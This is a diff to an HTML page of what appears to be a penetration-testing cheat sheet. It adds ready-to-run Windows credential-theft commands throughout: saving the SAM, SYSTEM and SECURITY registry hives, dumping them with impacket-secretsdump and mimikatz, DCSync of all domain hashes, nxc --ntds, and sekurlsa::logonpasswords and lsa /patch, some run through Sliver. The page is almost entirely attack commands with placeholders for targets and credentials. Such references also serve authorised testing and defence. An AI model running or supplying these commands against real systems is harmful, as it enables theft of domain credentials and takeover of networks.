@@ -337,7 +337,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/almandin/ntdsdotsqlite">ntdsdotsqlite</a></em></small></p>
 <h3 id="with-ntdsdit-and-system-hive">With ntds.dit and SYSTEM hive</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">impacket</button>
+<button data-tabset="set1" data-tabcontent="tab1" >impacket</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -ntds ntds.dit -system system LOCAL
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump -ntds ntds.dit -system system LOCAL
@@ -357,20 +357,58 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div></div></p>
 <h3 id="with-sam-system-and-security-hives">With SAM, SYSTEM and SECURITY Hives</h3>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">impacket</button>
+<button data-tabset="set2" data-tabcontent="tab1" >impacket</button>
+
+<button data-tabset="set2" data-tabcontent="tab2" >mimikatz</button>
+
+<button data-tabset="set2" data-tabcontent="tab3" >sliver</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+</span></span></span></code></pre></div></div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg save HKLM\SYSTEM system
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg save HKLM\security security
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg save hklm\sam sam
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::secrets /system:SYSTEM /security:SECURITY&#34;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::sam /system:SYSTEM /sam:SAM&#34;
+</span></span></span></code></pre></div></div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg save HKLM\SYSTEM system
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg save HKLM\security security
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg save hklm\sam sam
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">mimikatz -- &#39;&#34;lsadump::secrets /system:C:\SYSTEM /security:C:\SECURITY&#34;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">mimikatz -- &#39;&#34;lsadump::sam /system:C:\SYSTEM /sam:C:\SAM&#34;&#39;
 </span></span></span></code></pre></div></div></p>
 <h3 id="with-dcsync-right">With Dcsync right</h3>
 <p>
-<button data-tabset="set3" data-tabcontent="tab1" class="active">impacket</button>
+<button data-tabset="set3" data-tabcontent="tab1" >impacket</button>
 
 <button data-tabset="set3" data-tabcontent="tab2" >nxc</button>
+
+<button data-tabset="set3" data-tabcontent="tab3" >mimikatz</button>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump &#39;&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET&gt;&#39;
 </span></span></span></code></pre></div></div>
 
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc smb -dc-ip &lt;DC&gt; -u &lt;USER&gt; -H &lt;HASH&gt; --ntds
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc smb &lt;TARGET&gt; -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -H &lt;HASH&gt; --ntds
+</span></span></span></code></pre></div></div>
+
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::dcsync /all&#34; &#34;exit&#34;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Dump old creds
+</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::dcsync /user:&lt;DOMAIN&gt;\&lt;USER&gt; /history&#34; &#34;exit&#34;
+</span></span></span></code></pre></div></div></p>
+<h3 id="with-nt-authoritysystem--administrator">With NT AUTHORITY\SYSTEM / Administrator</h3>
+<p>
+<button data-tabset="set4" data-tabcontent="tab1" >mimikatz</button>
+
+<button data-tabset="set4" data-tabcontent="tab2" >sliver</button>
+
+<div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;sekurlsa::logonpasswords&#34;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::lsa /patch&#34;
+</span></span></span></code></pre></div></div>
+
+<div class="tabcontent" data-tabset="set4" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">mimikatz -- &#39;&#34;sekurlsa::logonpasswords&#34;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">mimikatz -- &#39;&#34;lsadump::lsa /patch&#34;&#39;
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
